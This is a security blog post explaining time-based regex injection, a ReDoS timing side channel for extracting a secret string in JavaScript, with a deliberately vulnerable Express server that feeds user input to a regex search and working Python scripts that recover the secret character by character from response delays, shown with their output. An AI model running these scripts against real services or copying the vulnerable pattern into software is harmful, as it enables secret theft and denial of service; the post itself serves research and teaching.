<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="Revisiting ReDoS: A Rough Idea of Data Exfiltration by ReDoS and Side-channe Techniques  The technique I will introduce this time is Time based Regex Injection.This is a recently announced technique"><meta property="og:type" content="article"><meta property="og:title" content="Time based Regex Injection"><meta property="og:url" content="https://blog.p6.is/time-based-regex-injection/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="Revisiting ReDoS: A Rough Idea of Data Exfiltration by ReDoS and Side-channe Techniques  The technique I will introduce this time is Time based Regex Injection.This is a recently announced technique"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://blog.hackeriet.no/images/RegexNFA.png"><meta property="article:published_time" content="2020-02-14T00:00:00.000Z"><meta property="article:modified_time" content="2022-10-14T13:04:25.645Z"><meta property="article:author" content="posix"><meta property="article:tag" content="javascript"><meta property="article:tag" content="regex dos"><meta property="article:tag" content="regex injection"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.hackeriet.no/images/RegexNFA.png"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>Time based Regex Injection</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="/how-pragyan-ctf-2020-hacked/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/codegate-ctf-2020-preliminary/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/time-based-regex-injection/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/time-based-regex-injection/&text=Time based Regex Injection"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Regex-DOS"><span class="toc-number">1.</span> <span class="toc-text">Regex DOS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-injection"><span class="toc-number">2.</span> <span class="toc-text">Blind injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#methods-using-regex"><span class="toc-number">3.</span> <span class="toc-text">methods using regex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#forward-search"><span class="toc-number">4.</span> <span class="toc-text">forward search</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#backward-search"><span class="toc-number">5.</span> <span class="toc-text">backward search</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Review"><span class="toc-number">6.</span> <span class="toc-text">Review</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">7.</span> <span class="toc-text">Reference</span></a></li></ol></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">Time based Regex Injection</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2020-02-14T00:00:00.000Z" itemprop="datePublished">2020-02-14</time></div>&nbsp;<div class="article-category">&nbsp;<i class="fas fa-archive"></i> <a class="category-link" href="/category/docs/">Docs</a></div>&nbsp;<div class="article-tag">&nbsp;<i class="fas fa-tag"></i> <a class="tag-link-link" href="/tags/javascript/" rel="tag">javascript</a>, <a class="tag-link-link" href="/tags/regex-dos/" rel="tag">regex dos</a>, <a class="tag-link-link" href="/tags/regex-injection/" rel="tag">regex injection</a></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><ul><li><a target="_blank" rel="noopener" href="https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques">Revisiting ReDoS: A Rough Idea of Data Exfiltration by ReDoS and Side-channe Techniques</a></li></ul><p>The technique I will introduce this time is <code>Time based Regex Injection</code>.<br>This is a recently announced technique on February 5th.<br>Based on ReDOS vulnerability, This technique makes it possible to extract the full part of string to be compared.</p><p>The research and presentation above was based on Python.<br>I researched for a short period of time how it could be used on JavaScript.</p><h2 id="Regex-DOS"><a href="#Regex-DOS" class="headerlink" title="Regex DOS"></a>Regex DOS</h2><p><img src="https://blog.hackeriet.no/images/RegexNFA.png" alt="regex"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* blocks Event loop */</span></span><br><span class="line">/([a-z]+)+$/.<span class="title function_">exec</span>(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Traditional ReDOS vulnerabilities are thought to be to the point of ruining the nodejs event loop, which consists of single threads, making it difficult to affect services based on php or python or etc… that respond to requests by forking the process.</p><h2 id="Blind-injection"><a href="#Blind-injection" class="headerlink" title="Blind injection"></a>Blind injection</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;secretmessage&#x27;</span>.<span class="title function_">match</span>(<span class="string">&#x27;se(((((.+)+)+)+)+)!&#x27;</span>);</span><br><span class="line"><span class="comment">// 2.17s</span></span><br><span class="line"><span class="string">&#x27;secretmessage&#x27;</span>.<span class="title function_">match</span>(<span class="string">&#x27;sa(((((.+)+)+)+)+)!&#x27;</span>);</span><br><span class="line"><span class="comment">// 0.57s</span></span><br></pre></td></tr></table></figure><p>In The <strong>Time based Regex injection</strong>, By adjusting the delay time of the ReDOS to the appropriate level depending on the situation.<br>We can determine the contents of the string being compared through search time.</p><p>The result itself is similar to the <strong>Blind SQL Injection</strong>.</p><h2 id="methods-using-regex"><a href="#methods-using-regex" class="headerlink" title="methods using regex"></a>methods using regex</h2><p>The methods that use regular expressions as factors in <strong>JavaScript</strong> include the <code>exec</code> method and <code>test</code> method of <code>RegExp</code>, <code>match</code> method, <code>place</code> method and <code>split</code> method of <code>String</code>.</p><h2 id="forward-search"><a href="#forward-search" class="headerlink" title="forward search"></a>forward search</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)();</span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">&#x27;THIS-IS-SECRET-DATA&#x27;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; answer &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> answer == <span class="string">&#x27;string&#x27;</span> &amp;&amp; !secret.<span class="title function_">search</span>(answer) &amp;&amp; secret === answer) &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(<span class="string">&#x27;Something Wrong :(&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;Something Wrong :O&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br></pre></td></tr></table></figure><p>The above is a <strong>server script</strong> for testing.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&#x27;&#x27;</span></span><br><span class="line">depth = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">    depth = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    prefix = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">2</span>:</span><br><span class="line">    depth = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">suffix = <span class="string">&#x27;(&#x27;</span> * depth + <span class="string">&#x27;.&#x27;</span> + <span class="string">&#x27;*)&#x27;</span> * depth + <span class="string">&#x27;!&#x27;</span></span><br><span class="line"></span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-&#x27;</span>:</span><br><span class="line">    begin = time()</span><br><span class="line">    requests.get(<span class="string">&#x27;http://localhost&#x27;</span>, params = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: prefix + c + suffix</span><br><span class="line">    &#125;);</span><br><span class="line">    r.append([c, time() - begin])</span><br><span class="line"></span><br><span class="line">r = <span class="built_in">sorted</span>(r, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> r[::-<span class="number">1</span>][:<span class="number">3</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] &#123;&#125; : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>The above is the script to use for testing (<strong>forward search</strong>).</p><p>When It matches the navigation string, takes more time to distinguish the string.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ python forward.py 3</span><br><span class="line">[*] T : 11.411083698272705</span><br><span class="line">[*] H : 4.056897163391113</span><br><span class="line">[*] I : 1.1705141067504883</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;T&#x27;</span> 3</span><br><span class="line">[*] H : 3.7386693954467773</span><br><span class="line">[*] _ : 0.020990371704101562</span><br><span class="line">[*] B : 0.02016758918762207</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;TH&#x27;</span> 3</span><br><span class="line">[*] I : 1.3154821395874023</span><br><span class="line">[*] 8 : 0.008851051330566406</span><br><span class="line">[*] 6 : 0.007730245590209961</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THI&#x27;</span> 3</span><br><span class="line">[*] S : 0.3685579299926758</span><br><span class="line">[*] N : 0.014027118682861328</span><br><span class="line">[*] K : 0.012799263000488281</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS&#x27;</span> 3</span><br><span class="line">[*] - : 0.13479828834533691</span><br><span class="line">[*] M : 0.01068568229675293</span><br><span class="line">[*] _ : 0.004689693450927734</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS-&#x27;</span> 3</span><br><span class="line">[*] I : 0.11702179908752441</span><br><span class="line">[*] N : 0.010607004165649414</span><br><span class="line">[*] J : 0.010245561599731445</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS-I&#x27;</span> 3</span><br><span class="line">[*] S : 0.019062042236328125</span><br><span class="line">[*] 9 : 0.011596441268920898</span><br><span class="line">[*] - : 0.010843992233276367</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS-I&#x27;</span> 4</span><br><span class="line">[*] S : 0.5390925407409668</span><br><span class="line">[*] P : 0.01799798011779785</span><br><span class="line">[*] K : 0.011503458023071289</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS-IS&#x27;</span> 4</span><br><span class="line">[*] - : 0.13084006309509277</span><br><span class="line">[*] C : 0.0070953369140625</span><br><span class="line">[*] I : 0.006118297576904297</span><br></pre></td></tr></table></figure><p>This is how you actually figure out a string through latency.</p><p>But there’s some limitation at this method.</p><table><thead><tr><th>Followed chars</th><th>Load</th><th>Delay time (seconds)</th></tr></thead><tbody><tr><td>1</td><td>-</td><td>-</td></tr><tr><td>2</td><td>-</td><td>-</td></tr><tr><td>3</td><td>220</td><td>1.30</td></tr><tr><td>4</td><td>77</td><td>1.21</td></tr><tr><td>5</td><td>38</td><td>1.55</td></tr><tr><td>6</td><td>22</td><td>1.10</td></tr><tr><td>7</td><td>15</td><td>1.20</td></tr><tr><td>8</td><td>11</td><td>1.21</td></tr><tr><td>9</td><td>9</td><td>1.86</td></tr><tr><td>10</td><td>7</td><td>1.11</td></tr><tr><td>11</td><td>6</td><td>1.55</td></tr><tr><td>12</td><td>5</td><td>1.09</td></tr><tr><td>13</td><td>5</td><td>5.56</td></tr><tr><td>14</td><td>4</td><td>1.19</td></tr><tr><td>15</td><td>4</td><td>4.53</td></tr><tr><td>16</td><td>4</td><td>19.02</td></tr><tr><td>17</td><td>3</td><td>0.61</td></tr><tr><td>18</td><td>3</td><td>1.86</td></tr><tr><td>19</td><td>3</td><td>5.23</td></tr></tbody></table><p>The above shows statistics on the relationship between these delays and the remaining characters.<br>This is greatly affected by the performance of your computer, so please take this as a simple reference.</p><p>The above regular expression was used to determine the value of the string to be compared.</p><p>However, if there is a limit to this method, if the remaining string is less than three characters, the length of the string required for navigation increases rapidly, and in real life the remaining three letters are less reliable because of the overhead or limiting input values.</p><p>Below is another form of regular expression to overcome these limitations.</p><h2 id="backward-search"><a href="#backward-search" class="headerlink" title="backward search"></a>backward search</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&#x27;&#x27;</span></span><br><span class="line">depth = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">    depth = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    prefix = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">2</span>:</span><br><span class="line">    depth = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">prefix2 = <span class="string">&#x27;(&#x27;</span> * depth</span><br><span class="line">suffix = <span class="string">&#x27;)*&#x27;</span> * depth</span><br><span class="line"></span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-&#x27;</span>:</span><br><span class="line">    begin = time()</span><br><span class="line">    requests.get(<span class="string">&#x27;http://localhost&#x27;</span>, params = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: prefix + prefix2 + <span class="string">&#x27;[^&#123;&#125;]&#x27;</span>.<span class="built_in">format</span>(c) + suffix + <span class="string">&#x27;!&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    r.append([c, time() - begin])</span><br><span class="line"></span><br><span class="line">r = <span class="built_in">sorted</span>(r, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> r[:<span class="number">5</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] &#123;&#125; : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>You can use the previous information you found to determine whether the string on the back is included!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python backward.py <span class="string">&#x27;THIS-IS-SECRET-&#x27;</span> 40</span><br><span class="line">[*] A : 0.00428318977355957</span><br><span class="line">[*] T : 0.006232500076293945</span><br><span class="line">[*] D : 0.006254673004150391</span><br><span class="line">[*] 4 : 2.561211109161377</span><br><span class="line">[*] M : 2.5667755603790283</span><br></pre></td></tr></table></figure><p>The search shows that the remaining four characters are consist of <code>D T A</code>.<br>After we get this information, we can create a combination of <code>4^4 (256)</code> for brute-force in the worst case.</p><table><thead><tr><th>Followed chars</th><th>Load</th><th>Delay time (seconds)</th></tr></thead><tbody><tr><td>1</td><td>785</td><td>1.38</td></tr><tr><td>2</td><td>224</td><td>0.53</td></tr><tr><td>3</td><td>80</td><td>1.36</td></tr><tr><td>4</td><td>38</td><td>1.39</td></tr><tr><td>5</td><td>22</td><td>1.58</td></tr><tr><td>6</td><td>15</td><td>1.33</td></tr><tr><td>7</td><td>11</td><td>1.34</td></tr><tr><td>8</td><td>9</td><td>2.04</td></tr><tr><td>9</td><td>7</td><td>1.42</td></tr><tr><td>10</td><td>6</td><td>1.75</td></tr><tr><td>11</td><td>5</td><td>1.17</td></tr><tr><td>12</td><td>5</td><td>5.55</td></tr><tr><td>13</td><td>4</td><td>1.20</td></tr><tr><td>14</td><td>4</td><td>4.63</td></tr><tr><td>15</td><td>4</td><td>19.9</td></tr><tr><td>16</td><td>3</td><td>0.65</td></tr><tr><td>17</td><td>3</td><td>1.86</td></tr><tr><td>18</td><td>3</td><td>5.68</td></tr><tr><td>19</td><td>3</td><td>17.4</td></tr></tbody></table><p>The above shows statistics on the relationship between delay time and the remaining characters in the rear navigation.<br>Likewise, the performance of your computer is greatly affected, so please take this as a simple reference.</p><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>This is a quite general technique.<br>And maybe It would be a good choice to analyze how to affect using this in the various libraries.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a target="_blank" rel="noopener" href="https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques">https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques</a></li><li><a target="_blank" rel="noopener" href="https://blog.hackeriet.no/regex-dos-in-java-layer/">https://blog.hackeriet.no/regex-dos-in-java-layer/</a></li></ul></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Regex-DOS"><span class="toc-number">1.</span> <span class="toc-text">Regex DOS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-injection"><span class="toc-number">2.</span> <span class="toc-text">Blind injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#methods-using-regex"><span class="toc-number">3.</span> <span class="toc-text">methods using regex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#forward-search"><span class="toc-number">4.</span> <span class="toc-text">forward search</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#backward-search"><span class="toc-number">5.</span> <span class="toc-text">backward search</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Review"><span class="toc-number">6.</span> <span class="toc-text">Review</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">7.</span> <span class="toc-text">Reference</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/time-based-regex-injection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/time-based-regex-injection/&text=Time based Regex Injection"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>